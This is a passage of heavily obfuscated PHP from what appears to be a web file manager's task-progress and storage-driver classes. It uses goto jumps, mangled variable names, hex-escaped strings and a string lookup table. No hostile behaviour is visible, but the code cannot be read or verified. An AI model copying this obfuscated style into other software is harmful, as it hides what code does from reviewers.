fœÀòÓ¤¨Ÿ; dİÄê›Ïæ•: Hook::bind($bäò¬Îù¤À[565], array($this, $bäò¬Îù¤À[1561])); Hook::bind($bäò¬Îù¤À[532], array($this, $bäò¬Îù¤À[1562])); Hook::bind($bäò¬Îù¤À[529], array($this, $bäò¬Îù¤À[1562])); goto cÁ†§ÑæªÆ; D»öøÌÑ²»: Hook::bind($bäò¬Îù¤À[561], array($this, $bäò¬Îù¤À[1559])); Hook::bind($bäò¬Îù¤À[562], array($this, $bäò¬Îù¤À[1560])); Hook::bind($bäò¬Îù¤À[564], array($this, $bäò¬Îù¤À[1561])); goto dİÄê›Ïæ•; D›„§³é: $dÈ‘èùŞ…™[$bäò¬Îù¤À[1029]] = $bäò¬Îù¤À[33]; $dÈ‘èùŞ…™[$bäò¬Îù¤À[1576]] = $bäò¬Îù¤À[33]; $dÈ‘èùŞ…™[$bäò¬Îù¤À[1577]] = 0; goto aÃ„ó™ì; cÁ†§ÑæªÆ: Hook::bind($bäò¬Îù¤À[534], array($this, $bäò¬Îù¤À[1562])); Hook::bind($bäò¬Îù¤À[536], array($this, $bäò¬Îù¤À[1562])); Hook::bind($bäò¬Îù¤À[538], array($this, $bäò¬Îù¤À[1562])); goto B„Ï¿¦Œ°ƒ; DÑ¬„­Ğ©: Hook::bind($bäò¬Îù¤À[1554], array($this, $bäò¬Îù¤À[1555])); Hook::bind($bäò¬Îù¤À[1114], array($this, $bäò¬Îù¤À[1556])); Hook::bind($bäò¬Îù¤À[1557], array($this, $bäò¬Îù¤À[1558])); goto D»öøÌÑ²»; BÃƒ‚’îÃÃ: } protected function endAfter() { goto c¹ç®¸ØŞ£; eÕõÀ¬Ãç‰: Hook::unbind($f£‚©òÓ‹í[529], array($this, $f£‚©òÓ‹í[1562])); Hook::unbind($f£‚©òÓ‹í[534], array($this, $f£‚©òÓ‹í[1562])); Hook::unbind($f£‚©òÓ‹í[536], array($this, $f£‚©òÓ‹í[1562])); goto dğÏ’É÷Ç; Dœï·‹¢ôÑ: Hook::unbind($f£‚©òÓ‹í[1557], array($this, $f£‚©òÓ‹í[1558])); Hook::unbind($f£‚©òÓ‹í[561], array($this, $f£‚©òÓ‹í[1559])); Hook::unbind($f£‚©òÓ‹í[562], array($this, $f£‚©òÓ‹í[1560])); goto fÓÔ ŸÔ; fÓÔ ŸÔ: Hook::unbind($f£‚©òÓ‹í[564], array($this, $f£‚©òÓ‹í[1561])); Hook::unbind($f£‚©òÓ‹í[565], array($this, $f£‚©òÓ‹í[1561])); Hook::unbind($f£‚©òÓ‹í[532], array($this, $f£‚©òÓ‹í[1562])); goto eÕõÀ¬Ãç‰; c¹ç®¸ØŞ£: $f£‚©òÓ‹í =& $_SERVER[…ë˜õ]; Hook::unbind($f£‚©òÓ‹í[1554], array($this, $f£‚©òÓ‹í[1555])); Hook::unbind($f£‚©òÓ‹í[1114], array($this, $f£‚©òÓ‹í[1556])); goto Dœï·‹¢ôÑ; dğÏ’É÷Ç: Hook::unbind($f£‚©òÓ‹í[538], array($this, $f£‚©òÓ‹í[1562])); Hook::unbind($f£‚©òÓ‹í[1563], array($this, $f£‚©òÓ‹í[1564])); Hook::unbind($f£‚©òÓ‹í[554], array($this, $f£‚©òÓ‹í[1565])); goto e†’…³Òøë; e†’…³Òøë: Hook::unbind($f£‚©òÓ‹í[1566], array($this, $f£‚©òÓ‹í[1567])); Hook::unbind($f£‚©òÓ‹í[1568], array($this, $f£‚©òÓ‹í[1569])); Hook::unbind($f£‚©òÓ‹í[1570], array($this, $f£‚©òÓ‹í[1571])); goto EÍ÷šŠÁß; EÍ÷šŠÁß: } public function copyMoveStart($D¤Ÿ»ƒì…, $AØÒß˜Ïñ, $c¶«¡âÑ¢, $Aï—ôë×ç´) { goto dÔ„›ª‚ğ; E¹’‡½Æ˜¥: $EšöËäÛ¦Ì[$aÌ¼ĞË†™¾[1582]] = KodIO::transferType($D¤Ÿ»ƒì…, $c¶«¡âÑ¢); $this->update(); goto B—ô£ÊØ°‰; bÖ”©Ä‘ß¹: if (substr($AØÒß˜Ïñ, 0, strlen($bˆË›Â ÈŠ)) == $bˆË›Â ÈŠ) { return; } if (substr($Aï—ôë×ç´, 0, strlen($bˆË›Â ÈŠ)) == $bˆË›Â ÈŠ) { return; } $EšöËäÛ¦Ì =& $this->task; goto E¹’‡½Æ˜¥; dÔ„›ª‚ğ: $aÌ¼ĞË†™¾ =& $_SERVER[…ë˜õ]; self::log($aÌ¼ĞË†™¾[1581] . $AØÒß˜Ïñ . $aÌ¼ĞË†™¾[66] . $Aï—ôë×ç´); $bˆË›Â ÈŠ = rtrim(TEMP_FILES, $aÌ¼ĞË†™¾[8]); goto bÖ”©Ä‘ß¹; B—ô£ÊØ°‰: } public function updateAfter() { goto a—ŠªÎŠù¾; böŠñíÍïÖ: $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1532]] = $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1579]] / $FØÂ ò‚ÚŠ[$E±‚çã‡µ[740]]; if ($FØÂ ò‚ÚŠ[$E±‚çã‡µ[1532]] > 0) { $b®£’Ñö = timeFloat() - $FØÂ ò‚ÚŠ[$E±‚çã‡µ[762]] - $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1535]]; $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1536]] = $b®£’Ñö * (1 - $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1532]]) / $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1532]]; } goto C³êÈ²ÏÏ; a—ŠªÎŠù¾: $E±‚çã‡µ =& $_SERVER[…ë˜õ]; $FØÂ ò‚ÚŠ =& $this->task; if (!$FØÂ ò‚ÚŠ[$E±‚çã‡µ[740]]) { return; } goto D¥‹‘ŸŞ¿È; D¥‹‘ŸŞ¿È: if ($this->sourceModelCopyFlag) { return; } if ($FØÂ ò‚ÚŠ[$E±‚çã‡µ[1582]] == $E±‚çã‡µ[1186]) { return; } if ($FØÂ ò‚ÚŠ[$E±‚çã‡µ[1582]] == $E±‚çã‡µ[1099] || $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1582]] == $E±‚çã‡µ[106]) { if ($FØÂ ò‚ÚŠ[$E±‚çã‡µ[1576]]) { $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1579]] = $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1578]] + $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1575]]; } } else { if ($FØÂ ò‚ÚŠ[$E±‚çã‡µ[1582]] == $E±‚çã‡µ[1187]) { if ($FØÂ ò‚ÚŠ[$E±‚çã‡µ[1576]] == $E±‚çã‡µ[1099]) { $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1579]] = $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1578]] + $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1575]] * 0.5; } else { if ($FØÂ ò‚ÚŠ[$E±‚çã‡µ[1576]] == $E±‚çã‡µ[106]) { $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1579]] = $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1578]] + $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1574]] * 0.5 + $FØÂ ò‚ÚŠ[$E±‚çã‡µ[1575]] * 0.5; } } } } goto böŠñíÍïÖ; C³êÈ²ÏÏ: } public function addPath($fˆÖÌŒŠ¯ö) { goto D³ô½±¾ƒÑ; D¦¿‹§ó: $dà·¡—‰í½ = IO::infoWithChildren($fˆÖÌŒŠ¯ö); $e×½“êùì = $Bò±‘’•˜™[$D’ì¶µ„à†[1583]] ? $Bò±‘’•˜™[$D’ì¶µ„à†[1583]][$D’ì¶µ„à†[1584]] : 0; $Bò±‘’•˜™[$D’ì¶µ„à†[1583]] = array($D’ì¶µ„à†[1584] => $e×½“êùì + 1, $D’ì¶µ„à†[407] => $dà·¡—‰í½[$D’ì¶µ„à†[28]], $D’ì¶µ„à†[75] => $dà·¡—‰í½[$D’ì¶µ„à†[75]], $D’ì¶µ„à†[489] => $dà·¡—‰í½[$D’ì¶µ„à†[489]] ? $dà·¡—‰í½[$D’ì¶µ„à†[489]] : $dà·¡—‰í½[$D’ì¶µ„à†[75]]); goto C‹½Ë¢‘§´; C‹½Ë¢‘§´: if ($dà·¡—‰í½[$D’ì¶µ„à†[29]] == $D’ì¶µ„à†[191]) { $Bò±‘’•˜™[$D’ì¶µ„à†[1027]] += 1; } else { $Bò±‘’•˜™[$D’ì¶µ„à†[1027]] += $dà·¡—‰í½[$D’ì¶µ„à†[80]][$D’ì¶µ„à†[78]]; if ($dà·¡—‰í½[$D’ì¶µ„à†[390]]) { $Bò±‘’•˜™[$D’ì¶µ„à†[1027]] += $dà·¡—‰í½[$D’ì¶µ„à†[80]][$D’ì¶µ„à†[79]] + 1; } } $Bò±‘’•˜™[$D’ì¶µ„à†[740]] += $dà·¡—‰í½[$D’ì¶µ„à†[77]]; $this->update(); goto f‹¼Ş…ÒÈß; D³ô½±¾ƒÑ: $D’ì¶µ„à† =& $_SERVER[…ë˜õ]; if (!$fˆÖÌŒŠ¯ö) { return; } $Bò±‘’•˜™ =& $this->task; goto D¦¿‹§ó; f‹¼Ş…ÒÈß: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($fÉ°ÑÚÏß) { $aáËÂÚÄéŒ =& $_SERVER[…ë˜õ]; $F¥ÒÇß¶›º =& $this->task; $F¥ÒÇß¶›º[$aáËÂÚÄéŒ[1572]] = $fÉ°ÑÚÏß[$aáËÂÚÄéŒ[28]]; $F¥ÒÇß¶›º[$aáËÂÚÄéŒ[1029]] = $fÉ°ÑÚÏß[$aáËÂÚÄéŒ[28]]; $this->update(); } public function copyFileStart($c™îâïå…, $d„óè¾‘, $B‹ùœ‰‰š, $Dò‘á‹„•ê, $Bø±³áÕß, $dš†ÀØğ´) { goto cÕ˜Ä°ãÒŠ; dßÂ‘ŠñÄ: $eİøëÛãƒ[$c†ÍÒ®®ÃÍ[1572]] = $E™£Á¤§ø¡; $eİøëÛãƒ[$c†ÍÒ®®ÃÍ[1574]] = (int) $c™îâïå…->size($d„óè¾‘); $eİøëÛãƒ[$c†ÍÒ®®ÃÍ[1575]] = 0; goto EÏ¼œ…‹ò; cÕ˜Ä°ãÒŠ: $c†ÍÒ®®ÃÍ =& $_SERVER[…ë˜õ]; $E™£Á¤§ø¡ = $Bø±³áÕß; if ($E™£Á¤§ø¡ == $GLOBALS[$c†ÍÒ®®ÃÍ[1585]]) { $E™£Á¤§ø¡ = $GLOBALS[$c†ÍÒ®®ÃÍ[1586]]; } goto a¼š«Çñ¥; Câ‘¨óì›: $this->update(); goto f†¨Œ²½ß; EÏ¼œ…‹ò: $eİøëÛãƒ[$c†ÍÒ®®ÃÍ[1029]] = $c†ÍÒ®®ÃÍ[33]; $eİøëÛãƒ[$c†ÍÒ®®ÃÍ[1576]] = $c†ÍÒ®®ÃÍ[33]; $eİøëÛãƒ[$c†ÍÒ®®ÃÍ[1577]] = 0; goto Câ‘¨óì›; a¼š«Çñ¥: $GLOBALS[$c†ÍÒ®®ÃÍ[1586]] = $Bø±³áÕß; $GLOBALS[$c†ÍÒ®®ÃÍ[1585]] = $dš†ÀØğ´; $eİøëÛãƒ =& $this->task; goto dßÂ‘ŠñÄ; f†¨Œ²½ß: } public function copyFileEnd($dø»Œ¥£á, $cëÌ¾Á‹ù, $e×‰Õá‚ªÖ, $DâŒ®ÌÁï, $c¯ï¨§Şš, $f¦²íİ ºó) { $B‡â¥ÎÄ¶ =& $_SERVER[…ë˜õ]; $aµµé×â‘É =& $this->task; $aµµé×â‘É[$B‡â¥ÎÄ¶[1575]] = $aµµé×â‘É[$B‡â¥ÎÄ¶[1574]]; $aµµé×â‘É[$B‡â¥ÎÄ¶[1576]] = $B‡â¥ÎÄ¶[33]; if ($c¯ï¨§Şš == $aµµé×â‘É[$B‡â¥ÎÄ¶[1572]]) { $aµµé×â‘É[$B‡â¥ÎÄ¶[1578]] += $aµµé×â‘É[$B‡â¥ÎÄ¶[1574]]; $aµµé×â‘É[$B‡â¥ÎÄ¶[1579]] = $aµµé×â‘É[$B‡â¥ÎÄ¶[1578]]; $this->update(1); } else { $this->update(); $aµµé×â‘É[$B‡â¥ÎÄ¶[1575]] = 0; } self::log($B‡â¥ÎÄ¶[1587] . $cëÌ¾Á‹ù . $B‡â¥ÎÄ¶[66] . $DâŒ®ÌÁï . $B‡â¥ÎÄ¶[227] . $c¯ï¨§Şš . $B‡â¥ÎÄ¶[1588] . $aµµé×â‘É[$B‡â¥ÎÄ¶[1572]]); } public function updateFileEnd($A¹ŠÀŠîøæ, $B­ó£õ¸¤) { goto FÃé§ô°“¬; BËŞ„ˆˆŠ: $Cğ¢Üóºƒ[$cËäÄ×¡ [1574]] = $B­ó£õ¸¤; $Cğ¢Üóºƒ[$cËäÄ×¡ [1578]] += $B­ó£õ¸¤; $Cğ¢Üóºƒ[$cËäÄ×¡ [1579]] = $Cğ¢Üóºƒ[$cËäÄ×¡ [1578]]; goto c°½×¥³‘; FÃé§ô°“¬: $cËäÄ×¡  =& $_SERVER[…ë˜õ]; $Cğ¢Üóºƒ =& $this->task; $Cğ¢Üóºƒ[$cËäÄ×¡ [1572]] = $A¹ŠÀŠîøæ; goto BËŞ„ˆˆŠ; c°½×¥³‘: $this->update(1); self::log($cËäÄ×¡ [1589] . $A¹ŠÀŠîøæ); goto B®ƒ·µš; B®ƒ·µš: } public function sourceModelCopy($A«îˆËÒ) { goto Dƒàô¿§À¥; Dƒàô¿§À¥: $aæ¿åÇ‘à =& $_SERVER[…ë˜õ]; $E‹³Â·ÖìÈ = $A«îˆËÒ[0]; $d»ÉŠƒ…Îê = $A«îˆËÒ[1]; goto b« ¬©õ¼Æ; E¶³ÛÑá¼: switch ($E‹³Â·ÖìÈ) { case $aæ¿åÇ‘à[530]: $D”ê½ˆÚÕ = 1; break; case $aæ¿åÇ‘à[533]: $d¾“×‹…˜‰[$aæ¿åÇ‘à[1572]] = $d»ÉŠƒ…Îê[$aæ¿åÇ‘à[28]]; break; case $aæ¿åÇ‘à[535]: $D”ê½ˆÚÕ = intval($A«îˆËÒ[$aæ¿åÇ‘à[375]] * 0.4); break; case $aæ¿åÇ‘à[537]: $D”ê½ˆÚÕ = intval($A«îˆËÒ[$aæ¿åÇ‘à[375]] * 0.2); break; case $aæ¿åÇ‘à[539]: $D”ê½ˆÚÕ = intval($A«îˆËÒ[$aæ¿åÇ‘à[375]] * 0.4); break; } $this->update($D”ê½ˆÚÕ); $this->sourceModelCopyFlag = !1; goto DÜÎˆ…¿Æ; b« ¬©õ¼Æ: $d¾“×‹…˜‰ =& $this->task; $this->sourceModelCopyFlag = !0; $D”ê½ˆÚÕ = 0; goto E¶³ÛÑá¼; DÜÎˆ…¿Æ: } public function sourceRemove($d£–İ™Ù§, $cñ³”ùÕŒÍ) { $cˆ˜œôèÚä =& $_SERVER[…ë˜õ]; $this->sourceModelCopyFlag = !0; $Eäğ”Ëà¤ = 1; if (isset($d£–İ™Ù§[$cˆ˜œôèÚä[80]])) { $Eäğ”Ëà¤ = $d£–İ™Ù§[$cˆ˜œôèÚä[80]][$cˆ˜œôèÚä[78]] + $d£–İ™Ù§[$cˆ˜œôèÚä[80]][$cˆ˜œôèÚä[79]] + 1; } $this->update($Eäğ”Ëà¤); $this->sourceModelCopyFlag = !1; } public function sourceMove($AÍéƒŒ¼‡) { $this->sourceRemove($AÍéƒŒ¼‡, !1); } public function curlProgress($a£èñ…¥â®, $cÓ„‰•’ì›, $B™Ä–İà…Ø, $Bá²æ½Âø, $F•œ­†  Æ) { $CÅæŸ¬‡¦ =& $_SERVER[…ë˜õ]; $Dô‡ŠÙ±± =& $this->task; if ($F•œ­†  Æ > 0) { $Dô‡ŠÙ±±[$CÅæŸ¬‡¦[1029]] = $CÅæŸ¬‡¦[1590]; $Dô‡ŠÙ±±[$CÅæŸ¬‡¦[1576]] = $CÅæŸ¬‡¦[106]; if ($Dô‡ŠÙ±±[$CÅæŸ¬‡¦[1574]]) { $Dô‡ŠÙ±±[$CÅæŸ¬‡¦[1575]] = $F•œ­†  Æ; } if ($Dô‡ŠÙ±±[$CÅæŸ¬‡¦[1577]]) { $Dô‡ŠÙ±±[$CÅæŸ¬‡¦[1575]] = $F•œ­†  Æ + $Dô‡ŠÙ±±[$CÅæŸ¬‡¦[1577]]; } } else { if ($B™Ä–İà…Ø > 0) { if ($Dô‡ŠÙ±±[$CÅæŸ¬‡¦[1574]] == $cÓ„‰•’ì›) { $Dô‡ŠÙ±±[$CÅæŸ¬‡¦[1575]] = $B™Ä–İà…Ø; $Dô‡ŠÙ±±[$CÅæŸ¬‡¦[1029]] = $CÅæŸ¬‡¦[1591]; $Dô‡ŠÙ±±[$CÅæŸ¬‡¦[1576]] = $CÅæŸ¬‡¦[1099]; } } } $this->update(); } public function curlProgressStart($C©Ñõ»à„») { } public function curlProgressEnd($e®¶†ÛÒâÍ) { goto Dù³‡šøìë; Dù³‡šøìë: $F“¸‹Õ×© =& $_SERVER[…ë˜õ]; $bë÷¿´‘Èî =& $this->task; $bÜˆ’†¼² = curl_getinfo($e®¶†ÛÒâÍ); goto D‘ˆ…¨Œ„™; D‘ˆ…¨Œ„™: $d©ùÔ¢ôĞ¥ = $bÜˆ’†¼²[$F“¸‹Õ×©[1592]]; if ($d©ùÔ¢ôĞ¥ == -1) { $d©ùÔ¢ôĞ¥ = $bÜˆ’†¼²[$F“¸‹Õ×©[1593]]; } if ($bë÷¿´‘Èî[$F“¸‹Õ×©[1576]] == $F“¸‹Õ×©[106] && $d©ùÔ¢ôĞ¥) { $bë÷¿´‘Èî[$F“¸‹Õ×©[1577]] += $d©ùÔ¢ôĞ¥; } goto B¦÷ñÃÇò; B¦÷ñÃÇò: $this->update(); goto E‘ùİËë™; E‘ùİËë™: } } class TaskHttp extends Task { protected function startAfter() { $EŠƒÊÀµƒ… =& $_SERVER[…ë˜õ]; $cŞë—­¼è› =& $this->task; $cŞë—­¼è›[$EŠƒÊÀµƒ…[1594]] = 1; Hook::bind($EŠƒÊÀµƒ…[1566], array($this, $EŠƒÊÀµƒ…[1595])); Hook::bind($EŠƒÊÀµƒ…[1568], array($this, $EŠƒÊÀµƒ…[1596])); Hook::bind($EŠƒÊÀµƒ…[1570], array($this, $EŠƒÊÀµƒ…[1597])); } protected function endAfter() { $dõ¥Ÿª’ä“ =& $_SERVER[…ë˜õ]; Hook::unbind($dõ¥Ÿª’ä“[1566], array($this, $dõ¥Ÿª’ä“[1595])); Hook::unbind($dõ¥Ÿª’ä“[1568], array($this, $dõ¥Ÿª’ä“[1596])); Hook::unbind($dõ¥Ÿª’ä“[1570], array($this, $dõ¥Ÿª’ä“[1597])); } public function progressStart($a Ë³œí¶) { $C¢ˆ«ñ®’’ =& $_SERVER[…ë˜õ]; $B«ÖäœÍÖœ = curl_getinfo($a Ë³œí¶); self::log($C¢ˆ«ñ®’’[1598] . $B«ÖäœÍÖœ[$C¢ˆ«ñ®’’[303]]); self::valueSet($this->task[$C¢ˆ«ñ®’’[388]], $this->task); } public function progressEnd($cÃõ•ŞÈ») { $BÀ‘Ü“¦–ø =& $_SERVER[…ë˜õ]; self::log($BÀ‘Ü“¦–ø[1599] . $this->task[$BÀ‘Ü“¦–ø[388]]); $this->end(); } public function progress($C¥§§ô×‡, $dœ¯°ìá™õ, $A…äçï§¨, $cŸñòÎ§‚“, $d”Ø°¼îé) { $F‹Í·Ñ³‰‚ =& $_SERVER[…ë˜õ]; $F½®â‡¬È› =& $this->task; if ($d”Ø°¼îé > 0) { $F½®â‡¬È›[$F‹Í·Ñ³‰‚[1027]] = $F½®â‡¬È›[$F‹Í·Ñ³‰‚[1027]] == 0 ? $cŸñòÎ§‚“ : $F½®â‡¬È›[$F‹Í·Ñ³‰‚[1027]]; $F½®â‡¬È›[$F‹Í·Ñ³‰‚[1041]] = $d”Ø°¼îé; } else { if ($A…äçï§¨ > 0) { $F½®â‡¬È›[$F‹Í·Ñ³‰‚[1027]] = $F½®â‡¬È›[$F‹Í·Ñ³‰‚[1027]] == 0 ? $dœ¯°ìá™õ : $F½®â‡¬È›[$F‹Í·Ñ³‰‚[1027]]; $F½®â‡¬È›[$F‹Í·Ñ³‰‚[1041]] = $A…äçï§¨; } } $this->update(); self::log("\160\162\x6f\x67\x72\x65\x73\163\x48\x74\x74\160\x3a\x64\157\x77\156\72{$A…äçï§¨}\57{$dœ¯°ìá™õ}\x3b\40\x75\x70\x6c\x6f\x61\x64\72{$d”Ø°¼îé}\x2f{$cŸñòÎ§‚“}\x3b"); } } goto b»Š÷Ûã–ï; dÕ’ŒÕŒíÜ: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\x73\164\157\162\x61\147\x65\114\x69\163\164"; public $field = array("\156\141\155\145", "\x73\151\172\x65\x4d\x61\x78", "\x73\171\x73\x74\145\x6d", "\x64\x65\x66\x61\165\154\164", "\x64\162\151\x76\x65\x72", "\x63\x6f\156\x66\x69\x67"); public function listData($EÙİöÃ±¡ = false, $f‚äÇî•¯“ = "\155\x6f\x64\x69\x66\171\124\x69\155\145", $D¹î½ìÓ¦µ = false) { $c»õÃ“ =& $_SERVER[…ë˜õ]; $AÄšë«‘“ = parent::listData($EÙİöÃ±¡, $f‚äÇî•¯“, $D¹î½ìÓ¦µ); if ($EÙİöÃ±¡) { return $AÄšë«‘“; } $EÑÅ×Ÿ÷†Œ = $this->ioSizeUseGet(array_to_keyvalue($AÄšë«‘“, $c»õÃ“[33], $c»õÃ“[388])); foreach ($AÄšë«‘“ as $EåºÍ¥ˆÕß => $fôó½ïÜ) { unset($AÄšë«‘“[$EåºÍ¥ˆÕß][$c»õÃ“[6]]); $AÄšë«‘“[$EåºÍ¥ˆÕß][$c»õÃ“[1680]] = isset($EÑÅ×Ÿ÷†Œ[$fôó½ïÜ[$c»õÃ“[388]]]) ? $EÑÅ×Ÿ÷†Œ[$fôó½ïÜ[$c»õÃ“[388]]] : 0; } return $AÄšë«‘“; } public function ioSizeUseGet($a±ò³öùøµ) { goto a¦äï·Ö•Å; eÕğÚ¢ÅÌ: $cËÃò‡Á = Cache::get($eöƒœ­é‘ê); if ($cËÃò‡Á) { return $cËÃò‡Á; } $aÁèöê©ïò = array($fºÒ…á¹‘¨[789] => $fºÒ…á¹‘¨[388], $fºÒ…á¹‘¨[1996] => $fºÒ…á¹‘¨[77]); goto EÂ¥âéº¤™; DİÇ‡‰¼Å: Cache::set($eöƒœ­é‘ê, $cËÃò‡Á, 60); return $cËÃò‡Á; goto FÍÚ„äğ“; a¦äï·Ö•Å: $fºÒ…á¹‘¨ =& $_SERVER[…ë˜õ]; if (!$a±ò³öùøµ) { return array(); } $eöƒœ­é‘ê = $fºÒ…á¹‘¨[1995] . implode($fºÒ…á¹‘¨[47], $a±ò³öùøµ); goto eÕğÚ¢ÅÌ; EÂ¥âéº¤™: $FáÇ®¹Şñ« = array($fºÒ…á¹‘¨[789] => array($fºÒ…á¹‘¨[7], $a±ò³öùøµ)); $cËÃò‡Á = Model($fºÒ…á¹‘¨[760])->field($aÁèöê©ïò)->where($FáÇ®¹Şñ«)->group($fºÒ…á¹‘¨[789])->select(); $cËÃò‡Á = array_to_keyvalue($cËÃò‡Á, $fºÒ…á¹‘¨[388], $fºÒ…á¹‘¨[77]); goto DİÇ‡‰¼Å; FÍÚ„äğ“: } public function getConfig($fß‡™ĞŞ‡) { $A»Œƒî«ˆ  = parent::listData($fß‡™ĞŞ‡); return json_decode($A»Œƒî«ˆ [$_SERVER[…ë˜õ][6]], !0); } public function update($b²öÒ¡°âÎ, $Dòğ˜ŸÕ‡) { goto ašò’ëÃÁå; F÷Å­Ñçí: $B™ôÚ»Ôœ¶ = parent::update($b²öÒ¡°âÎ, $Dòğ˜ŸÕ‡); if ($B™ôÚ»Ôœ¶ && $Dòğ˜ŸÕ‡[$dÑÄ—–ÇÀ…[34]]) { foreach ($dÈ¸†ğ©ß¦ as $có÷í½Îºñ) { if ($có÷í½Îºñ[$dÑÄ—–ÇÀ…[34]] && $có÷í½Îºñ[$dÑÄ—–ÇÀ…[388]] != $b²öÒ¡°âÎ) { parent::update($có÷í½Îºñ[$dÑÄ—–ÇÀ…[388]], array($dÑÄ—–ÇÀ…[34] => 0)); } } } return $B™ôÚ»Ôœ¶; goto Aßƒ  áƒ¶; A¨Á’‘šÊÍ: if (isset($dÈ¸†ğ©ß¦[$Bíƒİñ‘é]) && $dÈ¸†ğ©ß¦[$Bíƒİñ‘é][$dÑÄ—–ÇÀ…[388]] != $b²öÒ¡°âÎ) { return !1; } if (isset($Dòğ˜ŸÕ‡[$dÑÄ—–ÇÀ…[1997]]) && $Dòğ˜ŸÕ‡[$dÑÄ—–ÇÀ…[1997]] == $dÑÄ—–ÇÀ…[86]) { $this->checkConfig($Dòğ˜ŸÕ‡); } unset($Dòğ˜ŸÕ‡[$dÑÄ—–ÇÀ…[1997]]); goto F÷Å­Ñçí; ašò’ëÃÁå: $dÑÄ—–ÇÀ… =& $_SERVER[…ë˜õ]; $Bíƒİñ‘é = $Dòğ˜ŸÕ‡[$dÑÄ—–ÇÀ…[28]]; $dÈ¸†ğ©ß¦ = array_to_keyvalue(parent::listData(), $dÑÄ—–ÇÀ…[28]); goto A¨Á’‘šÊÍ; Aßƒ  áƒ¶: } public function add($c×Ş‰ËœË—) { goto dœ¶š„ùÑ; CŸ„šî…ƒÃ: return $dğ¼’âæ¡ù; goto eÂ“Ğã‹ôŒ; dœ¶š„ùÑ: $cê¢§–‘Àê =& $_SERVER[…ë˜õ]; $CÁ‡Š¼Óá÷ = array_to_keyvalue(parent::listData(), $cê¢§–‘Àê[28]); if (isset($CÁ‡Š¼Óá÷[$c×Ş‰ËœË—[$cê¢§–‘Àê[28]]])) { return !1; } goto d½¶ÚŠêĞ¯; d½¶ÚŠêĞ¯: $this->checkConfig($c×Ş‰ËœË—); $dğ¼’âæ¡ù = parent::insert($c×Ş‰ËœË—); if ($dğ¼’âæ¡ù && $c×Ş‰ËœË—[$cê¢§–‘Àê[34]]) { foreach ($CÁ‡Š¼Óá÷ as $E½Ï–¬øù›) { if ($E½Ï–¬øù›[$cê¢§–‘Àê[34]]) { parent::update($E½Ï–¬øù›[$cê¢§–‘Àê[388]], array($cê¢§–‘Àê[34] => 0)); } } } goto CŸ„šî…ƒÃ; eÂ“Ğã‹ôŒ: } public function checkConfig(&$eíàª½Á™Ê) { goto CÙƒà”ä‚…; e¼îÍ—ù»Ã: $F¶ğ›“›ªØ = $bë³ç•è‚„->getPath($D‰À¡‹¸Õˆ . $d’Ì¥Ã™Â’[1142]); if (!$bë³ç•è‚„->mkfile($F¶ğ›“›ªØ)) { show_json(LNG($d’Ì¥Ã™Â’[2002]), !1); } $f—›²½àìÚ[$d’Ì¥Ã™Â’[1081]] = $D‰À¡‹¸Õˆ; goto bôîÇ®Å‹„; d÷³ÔÒù”§: foreach ($f—›²½àìÚ as $A‡ï‰åÁ”Ä => $dè‚œƒã÷İ) { $f—›²½àìÚ[$A‡ï‰åÁ”Ä] = trim($dè‚œƒã÷İ); } $f—›²½àìÚ[$d’Ì¥Ã™Â’[1998]] = rand_string(6); $d¹È°ßä–– = $GLOBALS[$d’Ì¥Ã™Â’[6]][$d’Ì¥Ã™Â’[87]][$d’Ì¥Ã™Â’[797]]; goto BÉœ¿ŠÈá‚; CÙƒà”ä‚…: $d’Ì¥Ã™Â’ =& $_SERVER[…ë˜õ]; $A‚‰ƒ¯ÕÈ = strtolower($eíàª½Á™Ê[$d’Ì¥Ã™Â’[93]]); $f—›²½àìÚ = json_decode($eíàª½Á™Ê[$d’Ì¥Ã™Â’[6]], !0); goto d÷³ÔÒù”§; bôîÇ®Å‹„: $eíàª½Á™Ê[$d’Ì¥Ã™Â’[6]] = json_encode($f—›²½àìÚ); $eíàª½Á™Ê[$d’Ì¥Ã™Â’[93]] = $Fµ‚ê¬ğ‰Õ; return !0; goto D¾ø¹Æ³«‡; BÉœ¿ŠÈá‚: $Fµ‚ê¬ğ‰Õ = isset($d¹È°ßä––[$A‚‰ƒ¯ÕÈ]) ? $d¹È°ßä––[$A‚‰ƒ¯ÕÈ] : ucfirst($A‚‰ƒ¯ÕÈ); $bÄ¼±àá½é = $d’Ì¥Ã™Â’[71] . $Fµ‚ê¬ğ‰Õ; if (!$Fµ‚ê¬ğ‰Õ || !class_exists($bÄ¼±àá½é)) { write_log(array($d’Ì¥Ã™Â’[1999], $eíàª½Á™Ê, get_caller_info()), $d’Ì¥Ã™Â’[2000]); show_json(LNG($d’Ì¥Ã™Â’[2001]), !1, $eíàª½Á™Ê); } goto d‡×ÕÏğ˜à; d‡×ÕÏğ˜à: $bë³ç•è‚„ = new $bÄ¼±àá½é($f—›²½àìÚ); if (in_array($A‚‰ƒ¯ÕÈ, $bë³ç•è‚„->objectDriver)) { if (!$bë³ç•è‚„->isBucketCors() && !$bë³ç•è‚„->setBucketCors()) { $F„ÛÀˆ…İ˜ = LNG($d’Ì¥Ã™Â’[2002]); $F„ÛÀˆ…İ˜ .= $d’Ì¥Ã™Â’[2003] . LNG($d’Ì¥Ã™Â’[2004]); show_json($F„ÛÀˆ…İ˜, !1); } } $D‰À¡‹¸Õˆ = rtrim($f—›²½àìÚ[$d’Ì¥Ã™Â’[1081]], $d’Ì¥Ã™Â’[8]) . $d’Ì¥Ã™Â’[8]; goto e¼îÍ—ù»Ã; D¾ø¹Æ³«‡: } public function driverListSystem() { $céÀ‚áêï‡ =& $_SERVER[…ë˜õ]; $fŒ±ß½èÌ† = parent::listData(); 